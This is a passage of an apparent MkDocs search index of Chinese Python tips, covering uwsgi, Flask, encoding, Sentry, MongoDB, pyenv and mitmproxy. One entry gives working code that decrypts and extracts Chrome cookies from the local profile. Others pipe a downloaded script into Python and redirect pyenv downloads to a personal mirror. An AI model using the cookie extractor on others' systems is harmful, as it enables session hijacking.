)","title":"\u7ed9\u79cd\u5b50\u589e\u52a0\u4e00\u4e2atracker"},{"location":"Python/#torrenttracker","text":"\u4f7f\u7528torf\u5e93\uff0c\u8fd9\u4e2a\u5e93\u4f7f\u7528\u4e86python3.6\u624d\u652f\u6301\u7684\u7279\u6027\uff0c\u4f9d\u8d56\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001dict\u904d\u5386\u7684\u6709\u5e8f\u6027 \u6211\u4fee\u6539\u540e\u7684\u7248\u672c\u4e0b\u8f7d\uff0c\u652f\u6301py3.5\uff1ahttps://d.py3.io/torf.zip \u4ee3\u7801\uff1a t = torf . Torrent . read ( torrent_filename ) t . trackers =[ [new_tracker_url ] ] t . write ( \"new.torrent\" )","title":"\u4fee\u6539\u4e00\u4e2a.torrent\u6587\u4ef6\u7684tracker"},{"location":"Python/#uwsgi","text":"\u53c2\u8003\uff1ahttp://uwsgi-docs.readthedocs.io/en/latest/articles/TheArtOfGracefulReloading.html \u5728uwsgi.ini\u4e2d\u6dfb\u52a0\u4e00\u884c\uff1a master-fifo = /tmp/uwsgififo \u9700\u8981\u91cd\u542f\u7684\u65f6\u5019\u5c31\uff1a echo r>/tmp/uwsgififo \u6587\u4ef6\u6253\u5f00\u65b9\u5f0f\u5fc5\u987b\u662f\u201dw\u201d\u800c\u4e0d\u80fd\u662f\u201da\u201d\uff1a open(\"/tmp/uwsgififo\", \"w\").write(\"r\")","title":"uwsgi\u4f18\u96c5\u91cd\u542f"},{"location":"Python/#flask","text":"from flask import Flask , render_template , Blueprint , request , redirect , Markup app = Flask ( __name__ ) for path in [ 'pic' , 'skin' , 'images' , '\u66f4\u591a\u9759\u6001\u76ee\u5f55' ]: blueprint = Blueprint ( path , __name__ , static_url_path = '/' + path , static_folder = path ) app . register_blueprint ( blueprint )","title":"flask\u8bbe\u7f6e\u4e00\u5806\u9759\u6001\u76ee\u5f55"},{"location":"Python/#python35-openutf-8","text":"Windows\u4e0bopen\u6253\u5f00\u6587\u4ef6\u603b\u662f\u4f1a\u4f7f\u7528gbk\uff0c\u914d\u7f6e\u73af\u5883\u53d8\u91cf\u5982PYTHONIOENCODING\u90fd\u6ca1\u7528\uff0c\u5c31\u5f88\u6c14\uff0c\u96be\u9053\u53ea\u80fd\u6bcf\u6b21open\u90fd\u4fdd\u8bc1\u5199\u4e0aencoding=\u201dutf-8\u201d\u561b\uff1f\u5f53\u7136\u4e0d\u5fc5 google\u641c\u7d22\u5173\u952e\u8bcd\uff1awindows python3 change open file encoding \u89e3\u51b3\u65b9\u6848\uff1a\u53c2\u8003\uff1ahttps://stackoverflow.com/questions/31469707/changing-the-locale-preferred-encoding-in-python-3-in-windows \u6dfb\u52a0\u4ee3\u7801\uff1a\u7531\u4e8e\u53ea\u6709windows\u624d\u9700\u8981\u8fd9\u4e48\u5904\u7406\uff0c\u6240\u4ee5\u5148\u5224\u65ad\u64cd\u4f5c\u7cfb\u7edf import sys if sys . platform . startswith ( \"win\" ): import _locale _locale . _getdefaultlocale = ( lambda * args : [ 'en_US' , 'utf8' ])","title":"Python3.5 open\u6253\u5f00\u6587\u4ef6\u9ed8\u8ba4\u4f7f\u7528utf-8"},{"location":"Python/#pythonurl","text":"\u63d0\u53d6url\u60f3\u9047\u5230\u4e2d\u6587\u5b57\u7b26\u5c31\u4e0d\u7b97\u5165url\u4e2d\uff0c\u5199\u51fa\u4e86\u8fd9\u6837\u7684\u6b63\u5219(Python)\uff0c\u628a\u4e2d\u6587\u52a0\u5165\u5230\u6700\u540e\u7684\u6392\u9664\u5b57\u7b26\uff1a _url_re = re.compile(r'(?im)((?:https?://|www\\d{0,3}[.]|[a-z0-9.\\-]+[.][a-z]{2,4}/)(?:[^\\s()<>\uff0c\u3002\uff08\uff09]+|\\([^\\s()<>\uff0c\u3002\uff08\uff09]+\\))+(?:\\([^\\s()<>\uff0c\u3002\uff08\uff09]+\\)|[^\\u4e00-\\u9fa5\uff0c\u3002\uff08\uff09\\s`!()\\[\\]{};:\\'\".,<>?]))') \u7136\u540e\u5b9e\u9645\u8fd0\u884c\u7684\u65f6\u5019\u53d1\u73b0\u7f51\u7ad9\u7279\u5b9a\u9875\u9762\u8bbf\u95ee\u7279\u522b\u7f13\u6162\uff0cCPU\u5360\u7528\u9ad8\uff0c\u6392\u9664\u8bb8\u4e45\u6b7b\u5faa\u73af\u540e\u53d1\u73b0\u662f\u8fd9\u4e2a\u6b63\u5219\u82b1\u4e86\u592a\u957f\u7684\u65f6\u95f4 \u89e3\u51b3\u65b9\u6848\u5c31\u662f\u653e\u5f03\u4f7f\u7528\u6b63\u5219\u6765\u5254\u9664\u4e2d\u6587\uff0c\u63d0\u53d6\u51fa\u542b\u6709\u4e2d\u6587\u5b57\u7b26\u7684url\u540e\u518d\u505a\u5904\u7406\u53bb\u6389\u4e2d\u6587\u5b57\u7b26\uff08\u5b57\u8282\u6570>1\u7684\uff09 \u73b0\u5728\u4f7f\u7528\u7684\u6b63\u5219\u662f\uff1a _url_re = re.compile(r'(?im)((?:https?://|www\\d{0,3}[.]|[a-z0-9.\\-]+[.][a-z]{2,4}/)(?:[^\\s()<>]+|\\([^\\s()<>]+\\))+(?:\\([^\\s()<>]+\\)|[^\\s`!()\\[\\]{};:\\'\".,<>?]))') \u63d0\u53d6\u540e\u7684\u5904\u7406\u4ee3\u7801\uff1a start, end = match.span() while len(data[end-1].encode(\"utf-8\"))>1: end -= 1 \u73b0\u5728\u6539\u4e3a\u66f4\u52a0\u4fdd\u5b88\u7684 \u4ece\u5de6\u5f80\u53f3\u904d\u5386\uff0c\u9047\u5230\u5b57\u8282\u6570>1\u7684\u5c31\u7ec8\u6b62url\uff1a start , end = match . span () newend = start while newend < end and len ( data [ newend ] . encode ( \"utf-8\" )) == 1 : newend += 1 end = newend","title":"Python\u63d0\u53d6url \u6b63\u5219\u5339\u914d\u7684\u56de\u6eaf\u7206\u70b8\u95ee\u9898"},{"location":"Python/#ubuntugmpy2","text":"apt install libmpc-dev libmpfr-dev pip install gmpy2 \u8fa3\u9e21\u7684\u5b98\u65b9\u6587\u6863\u90fd\u4e0d\u63d0\u4e00\u4e0bapt\u5b89\u88c5\u4f9d\u8d56\u5e93\u7684\u4e8b\u60c5\uff0capt\u80fd\u641e\u5b9a\u7684\u4e3a\u5565\u8fd8\u8981\u81ea\u5df1\u7f16\u8bd1hhh \u652f\u6301python3 \u4e5f\u53ef\u4ee5-t .\u5b89\u88c5\u5230\u5f53\u524d\u76ee\u5f55\uff0c\u5c31\u662f\u7f16\u8bd1\u751f\u6210\u4e86\u4e00\u4e2aso\u6587\u4ef6","title":"ubuntu\u5b89\u88c5gmpy2"},{"location":"Python/#flask_1","text":"\u5728\u6a21\u677f\u6587\u4ef6\u4e2d\u5199for\u5faa\u73af\u7684\u65f6\u5019\uff0c\u4ea7\u751f\u7684html\u4f1a\u5305\u542b\u4ee3\u7801\u4e2d\u7684\u7f29\u8fdb\u7a7a\u683c\uff0c\u8fd9\u53ef\u80fd\u4f1a\u66b4\u9732\u4ee3\u7801\u7684\u4fe1\u606f\uff0c\u6240\u4ee5\u6709\u5fc5\u8981\u5220\u53bb \u5f88\u7b80\u5355 \u628a {% %} \u6539\u4e3a {%- -%} \u5373\u53ef {% - for i in range ( 1 , 10 ) - %} {{ i }} {% - endfor - %}","title":"Flask\u6a21\u677f \u5220\u53bb\u5faa\u73af\u5f15\u5165\u7684\u591a\u4f59\u7a7a\u683c"},{"location":"Python/#sentry","text":"\u5728py\u6587\u4ef6\u4e00\u5f00\u59cb\u8fdb\u884c\u52a0\u8f7d\uff0c\u4f1a\u81ea\u52a8\u5904\u7406\u6ca1\u6709\u88abhandle\u7684\u5f02\u5e38 \u5b89\u88c5\uff1apip install sentry_sdk import sentry_sdk from sentry_sdk import capture_message , capture_exception sentry_sdk . init ( \"....\" ) \u5728\u51fa\u73b0\u4e86\u610f\u5916\u4f46\u662f\u4e0d\u4e25\u91cd\u53ef\u4ee5pass\u7684\u65f6\u5019 \u4ee3\u66ff traceback.print_exc() \uff1a try : 1 / 0 except : capture_exception () capture_message ( \"oho, 1/0 failed...\" ) pass \u5982\u679c\u662fflask\u7684\u5e94\u7528 \u6bd4\u5982\u7528\u6237\u767b\u5f55\u4e86\uff0c\u5e0c\u671b\u62a5\u9519\u7684\u65f6\u5019\u987a\u5e26\u7ed9\u51fa\u7528\u6237\u540d\uff1a from sentry_sdk import configure_scope @app.before_request def before_request_session (): if \"username\" in session : with configure_scope () as scope : scope . user = { \"username\" : session [ \"username\" ]}","title":"\u4f7f\u7528sentry"},{"location":"Python/#sentry_1","text":"capture_exception \u548c capture_message \u90fd\u662f\u540c\u6b65\u8c03\u7528 \u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u8017\u65f6\u7684\u7f51\u7edc\u8bf7\u6c42 \u5c24\u5176\u5728\u5faa\u73af\u4e2d\u89e6\u53d1 \u4f1a\u5bfc\u81f4\u9875\u9762\u52a0\u8f7d\u901f\u5ea6\u663e\u8457\u53d8\u6162 \u5bf9\u4e8e\u5df2\u7ecf\u77e5\u9053\u4f1a\u6709\u5f02\u5e38\u4ea7\u751f\u4e5f\u4e0d\u5173\u5fc3\u7684\uff0c\u5c31\u4e0d\u8981\u6293\u4f4f\u8fd9\u79cd\u5f02\u5e38\u6765\u635f\u5bb3\u6027\u80fd\u4e86 pass\u5c31\u597d\u4e86","title":"\u4e0d\u8981\u8fc7\u4e8e\u4f9d\u8d56Sentry"},{"location":"Python/#pysysargv","text":"\u8fd9\u662f\u7531\u4e8e\u6253\u5f00\u65b9\u5f0f\u6ca1\u6709\u628a%*\u52a0\u4e0a\u7684\u539f\u56e0\uff0c\u4fee\u6539\u6ce8\u518c\u8868 regedit HKEY_CLASSES_ROOT\\Python.File\\Shell\\open\\command \u672b\u5c3e\u52a0\u4e0a %* \u5373\u53ef\uff0c\u4f8b\u5982\u6539\u4e3a \"C:\\Python37\\python.exe\" \"%1\" %* \u4f60\u4e5f\u53ef\u4ee5\u7528\u7ba1\u7406\u5458\u6743\u9650\u7684cmd\u6765\u505a\u4fee\u6539\uff1a \u5148\u67e5\u8be2.py\u7684\u6587\u4ef6\u7c7b\u578b\uff1a assoc .py \u67e5\u5230 .py=Python.File \u7136\u540e\u67e5\u4e00\u4e0b\u5f53\u524d\u7684\u8fd0\u884c\u547d\u4ee4\uff1a ftype Python.File \u7136\u540e\u7528 ftype Python.File=\"C:\\Python37\\python.exe\" \"%1\" %* \u4fee\u6539\u5373\u53ef","title":"\u89e3\u51b3\u547d\u4ee4\u884c\u6267\u884cpy\u6587\u4ef6\u6ca1\u6709sys.argv\u7684\u95ee\u9898"},{"location":"Python/#pythonwindows-chromecookie","text":"\u53c2\u8003\uff1ahttps://github.com/cheezone/ZhihuVAPI/blob/34ef5881f83da0026119e3167ebe727619774c7b/ZhihuVAPI/util/Session.py#L18 Chrome\u7684cookie\u7528sqlite\u6570\u636e\u5e93\u5b58\u50a8\uff0c\u7528WinAPI\u52a0\u5bc6\uff0c\u5f53\u524d\u7528\u6237\u4efb\u4f55\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u8c03\u7528\u89e3\u5bc6API\u6765\u83b7\u53d6cookie import sqlite3 import glob import os from win32.win32crypt import CryptUnprotectData def getcookie ( host ): result = [] for cookiepath in glob . glob ( os . environ [ 'LOCALAPPDATA' ] + r \"\\*\\*\\User Data\\Default\\Cookies\" ) + glob . glob ( os . environ [ 'LOCALAPPDATA' ] + r \"\\*\\User Data\\Default\\Cookies\" ): sql = \"select host_key,name,encrypted_value from cookies where host_key=' %s '\" % host with sqlite3 . connect ( cookiepath ) as conn : cu = conn . cursor () cookies = { name : CryptUnprotectData ( encrypted_value )[ 1 ] . decode () for host_key , name , encrypted_value in cu . execute ( sql ) . fetchall ()} result . extend ([ k + \"=\" + v for k , v in cookies . items ()]) return result \u8c03\u7528\u5982 getcookie(\".zhihu.com\")","title":"Python\u83b7\u53d6Windows Chrome\u7684Cookie"},{"location":"Python/#winencodingutf-8","text":"\u5728Windows\u4e0a\u5199\u4ee3\u7801\uff0c\u76ee\u6807\u90e8\u7f72\u73af\u5883\u4e3alinux\uff0c\u672c\u673a\u8fd0\u884c\u7684\u65f6\u5019\u4e0d\u60f3\u6bcf\u6b21\u8bfb\u5199\u6587\u4ef6\u90fd\u8981\u5199 encoding=\"utf-8\" \u4fee\u6539 C:\\Python38\\Lib\\site.py \uff0c\u672b\u5c3e\u52a0\u4e0a\uff1a import _locale _locale . _getdefaultlocale = ( lambda * args : [ 'en_US' , 'utf8' ]) \u9a8c\u8bc1\u53ef\u4ee5\u7528\uff1a python -c \"print(open('x','w').encoding)\" \u8f93\u51fa utf8 \u800c\u4e0d\u662f cp936 \u5373\u53ef \u53c2\u8003\uff1a https://juejin.im/post/5bd2b6d5e51d45735c3c0453","title":"Win\u5f00\u53d1\u6446\u8131\u6bcf\u6b21\u90fd\u8981\u5199\u7684encoding=utf-8"},{"location":"Python/#ubuntu1604python37","text":"\u5e76\u4e14\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u7684python apt - key adv -- keyserver keyserver . ubuntu . com -- recv - keys BA6932366A755776 && \\ echo \"deb http://ppa.launchpad.net/deadsnakes/ppa/ubuntu xenial main\" > / etc / apt / sources . list . d / python . list && \\ apt update && apt install - y python3 . 7 - dev && \\ update - alternatives -- install / usr / bin / python python / usr / bin / python3 . 7 50 && \\ curl https : // bootstrap . pypa . io / get - pip . py | python && \\ pip install - U setuptools \u4f46\u662f\u5728ubuntu 14.04\u4e0a\u4ece\u8fd9\u4e2appa\u6e90\u5b89\u88c5\u7684python\u6ca1\u6709_ssl\u7684\u5e93\uff0c\u65e0\u6cd5\u4f7f\u7528pip\u5f88\u8ff7\uff08\u89e3\u51b3\u65b9\u6848\u5c31\u662f\u5f00\u4e86\u4e00\u4e2adocker ubuntu16.04\u7684\u5bb9\u5668\u7ee7\u7eed\uff09","title":"Ubuntu16.04\u5b89\u88c5Python3.7"},{"location":"Python/#keyboardinterrupt","text":"\u573a\u666f\uff1a \u8dd1\u722c\u866b\u7b49\u4f9d\u8d56\u7f51\u7edc\u7684\u4ee3\u7801\uff0c\u9047\u5230\u7f51\u7edc\u4e0d\u4f73\u7684\u65f6\u5019\u4e00\u76f4\u5361\u4f4f\u4e0d\u518d\u6267\u884c\uff0c\u589e\u52a0timeout\u8bbe\u7f6e\u786e\u5b9e\u662f\u4e00\u79cd\u65b9\u6cd5\uff0c\u6709\u6ca1\u6709\u4e0d\u7528\u6539\u4ee3\u7801\u7684\u65b9\u5f0f\u5462\uff1f \u4f9d\u8d56\uff1a apt install inotify-tools watch.sh: #!/bin/bash while true ; do inotifywait -e modify -t 100 $1 res = $? if [ \" $res \" == \"2\" ] ; then echo \"[`date`] Time Out!\" $2 || break fi sleep 60 done \u7528\u6cd5\uff1a python -u run.py >& log.txt & ps #\u67e5\u770bpython\u8fdb\u7a0b\u7684id, \u5047\u8bbe\u4e3a12345 ./watch.sh log.txt \"kill -SIGINT 12345\" \u89e3\u91ca\uff1apython\u6307\u5b9a\u8f93\u51fa\u6d41\u4e0d\u7f13\u5b58\uff0c\u4fdd\u8bc1\u6700\u65b0\u7684print\u4e5f\u80fd\u5b9e\u65f6\u5199\u5165\u6587\u4ef6\u4e2d \u7136\u540e\u4f7f\u7528inotifywait\u8fd9\u4e2a\u5de5\u5177\u89c2\u5bdf\u6587\u4ef6 $1 \u5728100\u79d2\u5185\u6709\u6ca1\u6709\u53d1\u751f\u4fee\u6539 \u5982\u679c\u6ca1\u6709\u4fee\u6539\u5c31\u6267\u884c\u7528\u6237\u63d0\u4f9b\u7684\u53c2\u6570 $2 \uff0c\u8fd9\u91cc\u662f\u4f7f\u7528kill\u53d1\u9001SIGINT\u4fe1\u53f7 \u5728Linux\u91cc\uff0c\u7528\u6237\u6309Ctrl+C\u5c31\u662fBASH\u7ed9\u5f53\u524d\u524d\u53f0\u7684\u8fdb\u7a0b\u53d1\u9001\u8fd9\u4e2a\u4fe1\u53f7 \u5982\u679c\u8fdb\u7a0b\u5df2\u7ecf\u7ed3\u675f\uff0c\u90a3\u4e48kill\u4f1a\u62a5\u9519\u627e\u4e0d\u5230\u8fdb\u7a0b\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u53ef\u4ee5break\u8df3\u51fa\u5faa\u73af\u4e86 \u5982\u679c\u53d1\u751f\u4e86\u4fee\u6539\u5c31\u6b47\u4e00\u5206\u949f\u540e\u7ee7\u7eed\u89c2\u5bdf \u8fd9\u4e2a\u573a\u666f\u4e0b\u5141\u8bb8\u5ef6\u8fdf\u6ca1\u5fc5\u8981\u4e00\u76f4\u89c2\u5bdf\uff0c\u53ea\u8981\u5361\u4f4f\u7684\u65f6\u5019\u80fd\u53d1\u73b0\u5373\u53ef\uff08\u6700\u8fdf160\u79d2\uff09 \u5f53\u7136\u722c\u866b\u4ee3\u7801\u9700\u8981\u5904\u7406\u5f02\u5e38\uff0c\u5931\u8d25\u7684\u65f6\u5019\u7ee7\u7eed\u4e0b\u4e00\u6b21\u722c\u53d6\u6216\u8005\u91cd\u8bd5\u5373\u53ef","title":"\u5224\u65ad\u4ee3\u7801\u662f\u5426\u5361\u4f4f\uff0c\u81ea\u52a8\u53d1\u9001KeyboardInterrupt"},{"location":"Python/#pythonstartup-pythonimport","text":"\u7ecf\u5e38\u542f\u52a8Python\u5f53\u8ba1\u7b97\u5668\u7528\uff0c\u4f46\u6709\u4e9b\u65f6\u5019\u4e5f\u9700\u8981\u6267\u884cquote\u4e4b\u7c7b\u7684\u51fd\u6570\uff0c\u6bcf\u6b21\u90fd\u8981\u624b\u52a8import\u5c31\u5f88\u70e6 \u6240\u4ee5\u53ef\u4ee5\u914d\u7f6e\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u6765\u8ba9\u542f\u52a8Python\u65f6\u81ea\u52a8\u6267\u884c\u8fd9\u4e9bimport\u64cd\u4f5c Note \u6ce8\u610f\u8fd9\u4e2a\u4e0d\u4f1a\u6539\u53d8Python\u6267\u884c.py\u6587\u4ef6\u7684\u884c\u4e3a\uff0c\u53ea\u5728Python Interpreter\u4e2d\u751f\u6548 Windows\u5728cmd\u91cc\u53ef\u4ee5\u7528setx\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u6216\u8005\u4f60\u4e5f\u53ef\u4ee5\u7f16\u8f91\u6ce8\u518c\u8868 HKEY_CURRENT_USER\\Environment \u53c2\u8003\uff1a http://www.dowdandassociates.com/blog/content/howto-set-an-environment-variable-in-windows-command-line-and-registry/ setx PYTHONSTARTUP d : \\ myshell \\ pyload . py \u8fd9\u4e2a\u811a\u672c\u9700\u8981\u5feb\u901f\u52a0\u8f7d\uff0c\u907f\u514d\u542f\u52a8Python\u592a\u6162\uff0c\u6240\u4ee5\u4f7f\u7528lazyload\u6765\u628a\u771f\u6b63\u7684import\u7559\u5230\u4f7f\u7528\u65f6\uff1a \u4f9d\u8d56\uff1a PYTHONUTF8=1\u4f7f\u5f97windows\u7684python\u8bfb\u5199\u6587\u4ef6\u9ed8\u8ba4\u4e5f\u4f7f\u7528UTF8 set PYTHONUTF8=1 pip install lazy_import \u5148\u7b80\u8981\u6982\u62ec\u4e00\u4e0b\u8fd9\u4e2a\u811a\u672c\u63d0\u4f9b\u4e86\u4e9b\u5565\uff1a \u6807\u51c6\u5e93\uff1a time , sys , os , json , pickle , csv , requests , np ( numpy ), plt ( matplotlib . pyplot ) \u5bf9\u8c61\uff1a a\u662fEasyLogin (), sess\u662frequests . session () \u51fd\u6570\uff1a pload ( filename , default ) \u8f7d\u5165\u4e00\u4e2a pickle\u6587\u4ef6 pdump ( filename , data ) \u5c06 data\u5199\u5165pickle\u6587\u4ef6 jload \u7528 json\u8bfb\u53d6\u6587\u4ef6 jload \u7528 json\u5199\u5165\u6587\u4ef6 bd ( b64_string ) \u89e3\u7801 base64\u5b57\u7b26\u4e32 \uff0c\u8fd4\u56de str \uff0c\u81ea\u52a8\u8865\u9f50\u7b49\u53f7\uff0c\u4e0d\u4f1a Invalid base64 - encoded string hd ( b16_string ) hex decode \u5c06 hex\u5b57\u7b26\u4e32\u8f6c\u4e3abytes myprint \u663e\u793a\u5f53\u524d\u65f6\u95f4\u7684 print md5 \u8ba1\u7b97\u7ed9\u5b9a\u5b57\u7b26\u4e32\u7684 md5\u768432\u5b57\u8282hex\u5b57\u7b26\u4e32 t () int ( time . time ()) d () \u7b49\u4ef7\u4e8e date - d @ xxx \uff0c\u5c06 timestamp\u8f6c\u4e3a\u4eba\u7c7b\u53ef\u8bfb\u7684\u683c\u5f0f \uff0c\u4e5f\u652f\u6301\u6beb\u79d2\u7684\u8f93\u5165 \u7b80\u5199\uff1a jl = json . loads pp = pprint . pprint sleep = time . sleep leval = ast . literal_eval import _locale _locale . _getdefaultlocale = ( lambda * args : [ 'en_US' , 'utf8' ]) import time from time import sleep import sys import json import pickle def pload ( filename , default = None , lib = pickle ): try : res = lib . load ( open ( filename , \"rb\" )) except : if default is None : raise return default return res def pdump ( filename , data , lib = pickle ): open ( filename , \"w\" + ( \"b\" if lib == pickle else \"\" )) . write ( lib . dumps ( data )) def jload ( filename , default = None ): return pload ( filename , default = default , lib = json ) def jdump ( filename , data ): return pdump ( filename , data , lib = json ) import os import csv from urllib.parse import quote , unquote from base64 import b64encode , b64decode , b16encode , b16decode def bd ( b64_string ): b64_string += \"=\" * (( 4 - len ( b64_string ) % 4 ) % 4 ) return b64decode ( b64_string ) . decode () jl = json . loads def hd ( b16_string ): return b16decode ( b16_string . upper ()) def myprint ( * args , ** kwargs ): args = list ( args ) args [ 0 ] = \"[\" + time . strftime ( \"%Y-%m- %d %H:%M:%S\" ) + \"] \" + str ( args [ 0 ]) print ( * args , ** kwargs ) import lazy_import requests = lazy_import . lazy_module ( \"requests\" ) numpy = np = lazy_import . lazy_module ( \"numpy\" ) plt = lazy_import . lazy_module ( \"matplotlib.pyplot\" ) el = EasyLogin = lazy_import . lazy_class ( \"EasyLogin.EasyLogin\" ) pp = pprint = lazy_import . lazy_function ( \"pprint.pprint\" ) leval = lazy_import . lazy_function ( \"ast.literal_eval\" ) import hashlib def _load_hashlib ( name ): def f ( s ): if isinstance ( s , str ): s = bytes ( s , \"utf-8\" ) return getattr ( hashlib , name )( s ) . hexdigest () return f md5 = _load_hashlib ( \"md5\" ) sha1 = _load_hashlib ( \"sha1\" ) sha512 = _load_hashlib ( \"sha512\" ) class _A (): def __getattr__ ( self , name ): global a a = el () return getattr ( a , name ) a = _A () class _sess (): def __getattr__ ( self , name ): global sess sess = requests . session () return getattr ( sess , name ) sess = _sess () def t (): return int ( time . time ()) from datetime import datetime , timedelta def d ( ts ): ts = int ( ts ) if len ( str ( ts )) == 13 : ts = ts // 1000 return datetime . fromtimestamp ( ts ) . strftime ( \"%Y-%m- %d %H:%M:%S\" )","title":"\u8bbe\u7f6ePYTHONSTARTUP\u73af\u5883\u53d8\u91cf \u542f\u52a8Python\u81ea\u52a8\u6267\u884c\u4e00\u4e9bimport"},{"location":"Python/#pythonmongodb","text":"\u722c\u53d6\u6570\u636eajax\u63a5\u53e3\u8fd4\u56de\u7684\u662fjson\u6570\u636e\uff0c\u61d2\u5f97\u8f6c\u6362\u6210mysql\u7684\u8868\u793a\uff0c\u76f4\u63a5\u4e22\u7ed9mongo\u5457 \u53ef\u89c6\u5316\u5ba2\u6237\u7aef\u4f7f\u7528\u5b98\u65b9\u7684 Compass","title":"Python\u4f7f\u7528MongoDB"},{"location":"Python/#server","text":"docker run -d --name mongo -e MONGO_INITDB_ROOT_USERNAME=adminusername -e MONGO_INITDB_ROOT_PASSWORD=password -v /srv/mongo:/data/db -p 27017:27017 mongo \u5b89\u88c5\u540e\u7684\u8fde\u63a5\u5b57\u7b26\u4e32\u662f\uff1a mongodb://adminusername:password@ip:27017","title":"\u5b89\u88c5server"},{"location":"Python/#_15","text":"","title":"\u589e\u5220\u67e5\u6539"},{"location":"Python/#_16","text":"\u5d4c\u5957\u7684\u683c\u5f0f\u7528.\u8868\u793a \u4f8b\u5982 {\"a.b\": \"1\"} \u53ef\u4ee5\u67e5\u5230\u6587\u6863 {a:{b:\"1\"}} Python\u4ee3\u7801\uff1a import pymongo client = pymongo . MongoClient ( \"mongodb://adminusername:password@127.0.0.1:27017\" ) table = client . database_name . table_name print ( table . find_one ({ \"_id\" : id })) print ( table . count_documents ({}))","title":"\u67e5\u8be2"},{"location":"Python/#_17","text":"insert ignore into \u5ffd\u7565\u5df2\u7ecf\u5b58\u5728\u7684\uff1a try : table . insert_many ( data , ordered = False ) except pymongo . errors . BulkWriteError : pass replace into \u8986\u76d6\u5df2\u7ecf\u5b58\u5728\u7684\uff1a\u4f7f\u7528upcert\u4e0d\u5b58\u5728\u65f6\u63d2\u5165 for item in data: # \u4f60\u5f88\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u5b9a\u4e49_id # item[\"_id\"] = \"_\".join([...]) # pprint(item) table.update({'_id':item[\"_id\"]}, item, True)","title":"\u6279\u91cf\u589e\u52a0"},{"location":"Python/#_18","text":"\u7c7b\u4f3c\u7684\u6709\u51fd\u6570\uff1adelete_one, delete_many","title":"\u5220\u9664"},{"location":"Python/#join","text":"table\u4e2d\u6587\u6863\u91cc\u6709\u4e00\u4e2a\u5c5e\u6027idB\uff0c\u5bf9\u5e94tableB\u7684_id\uff0c\u4f7f\u7528 $lookup \u505ajoin\u64cd\u4f5c\uff0c\u65e0\u8bba\u6709\u6ca1\u6709\u67e5\u5230\u90fd\u4f1a\u8fd4\u56de\u65b0\u7684\u6587\u6863\uff0c\u6ca1\u67e5\u5230\u65f6dst\u5c5e\u6027\u4e3a\u7a7a\u6570\u7ec4 \u6240\u4ee5\u53ef\u4ee5\u7528 $match \u7ee7\u7eed\u7b5b\u9009\u67e5\u5230\u7684\u5185\u5bb9\uff1b\u7136\u540e\u7edf\u8ba1\u6570\u91cf\uff0c\u6ce8\u610f\u5230$count\u5728\u6ca1\u6709\u7ed3\u679c\u7684\u65f6\u5019\u4e0d\u8fd4\u56de\u5185\u5bb9\uff0c\u9700\u8981\u5355\u72ec\u5904\u7406 def howmany(): pipeline = [ {\"$match\": {\"idB\": {\"$exists\": True}}}, {\"$lookup\": {\"from\": 'tableB', \"localField\": 'idB', \"foreignField\": '_id', \"as\": 'dst'}}, {\"$match\": {\"dst\": {\"$size\": 1}}}, {\"$count\": \"cnt\"} ] data = list(table.aggregate(pipeline)) if not data: return 0 return data[0][\"cnt\"]","title":"\u591a\u8868join\u67e5\u8be2"},{"location":"Python/#_19","text":"pipeline\u4e2d\u4f7f\u7528\uff1a\u4f46\u662f\u6ce8\u610f\u53ef\u80fd\u4f1a\u6709\u91cd\u590d\u7684\u5143\u7d20 \u9700\u8981\u81ea\u5df1\u53bb\u91cd {\"$sample\": {\"size\":10}}","title":"\u968f\u673a\u91c7\u6837"},{"location":"Python/#pyenvpython","text":"\u60f3\u81ea\u5df1\u7ef4\u62a4\u4e00\u4e2a\u5b8c\u6574\u7684\u865a\u62df\u73af\u5883\uff0c\u65b9\u4fbf\u7684\u5b89\u88c5\u5404\u79cd\u7248\u672c\uff0c\u7528 pyenv \u5457 \u5b89\u88c5\uff1a git clone https : // github . com / pyenv / pyenv . git ~/. pyenv echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' >> ~/. bash_profile echo 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' >> ~/. bash_profile echo - e 'if command -v pyenv 1>/dev/null 2>&1; then \\n eval \"$(pyenv init -)\" \\n fi' >> ~/. bash_profile \u7136\u540e\u5c31\u80fd\u7f16\u8bd1\u5b89\u88c5\u7279\u5b9a\u7248\u672c\u7684Python\u4e86\uff0c\u4ee53.7.0\u4e3a\u4f8b\uff1a\u4f7f\u7528\u6211\u63d0\u4f9b\u7684www.python.org\u7684\u955c\u50cf apt install -y libffi-dev libgnutls28-dev cd ~/.pyenv/plugins sed -i 's#www.python.org#py.py3.io#g' $(grep www.python.org -r . -l) pyenv install -v 3.7.0 pyenv global 3.7.0 \u4e4b\u540e\u4f7f\u7528\u5982\u679c\u9047\u5230\u5bc6\u7801\u5b66\u5e93\u7684\u95ee\u9898\uff1a pip uninstall pycrypto pycryptodome pip install pycryptodome","title":"\u4f7f\u7528pyenv\u7f16\u8bd1\u5b89\u88c5\u4e0d\u540c\u7248\u672c\u7684Python"},{"location":"Python/#_20","text":"\u7fa4\u804a\u52a0\u5165\u673a\u5668\u4eba \u5173\u952e\u8bcd\u8bbe\u7f6e\u4e3a\u4e00\u5b9a\u4f1a\u51fa\u73b0\u7684\u5b57\u7b26\u5982 .\u3002[ \uff0c\u83b7\u53d6url\u540e\u8c03\u7528\u65f6\u53ea\u9700\u8981\u4f20\u5165token\u90e8\u5206 import requests def dingsend ( token , text ): data = { \"msgtype\" : \"text\" , \"text\" : { \"content\" : text }, \"isAtAll\" : False } return requests . post ( \"https://oapi.dingtalk.com/robot/send?access_token=\" + token , json = data )","title":"\u53d1\u9001\u9489\u9489\u6d88\u606f"},{"location":"Python/#mitmproxy","text":"python3 -m pip install mitmproxy \u53c2\u8003\uff1a https://stackoverflow.com/questions/51893788/using-mitmproxy-inside-python-script from mitmproxy.options import Options from mitmproxy.proxy.config import ProxyConfig from mitmproxy.proxy.server import ProxyServer from mitmproxy.tools.dump import DumpMaster import threading import asyncio import time class Addon ( object ): def __init__ ( self ): self . num = 1 def request ( self , flow ): flow . request . headers [ \"count\" ] = str ( self . num ) def response ( self , flow ): self . num = self . num + 1 flow . response . headers [ \"count\" ] = str ( self . num ) print ( self . num ) # see source mitmproxy/master.py for details def loop_in_thread ( loop , m ): asyncio . 